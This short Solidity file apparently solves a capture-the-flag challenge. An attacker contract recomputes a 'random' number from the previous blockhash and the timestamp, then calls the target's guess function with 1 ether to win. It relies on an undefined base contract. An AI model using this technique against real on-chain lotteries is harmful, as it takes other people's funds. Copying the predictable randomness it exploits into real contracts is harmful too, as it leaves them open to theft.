pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function guess(uint8) public payable {}
}

contract GuessTheNewNumberChallengeAux is LotteryAux {
    
    function guessNow(address t) public payable {
        uint8 luckyGuess = uint8(keccak256(blockhash(block.number - 1), now));
        
        GuessTheNewNumberChallenge gtnnc = GuessTheNewNumberChallenge(t);
        gtnnc.guess.value(1 ether)(luckyGuess);
    }
    
}
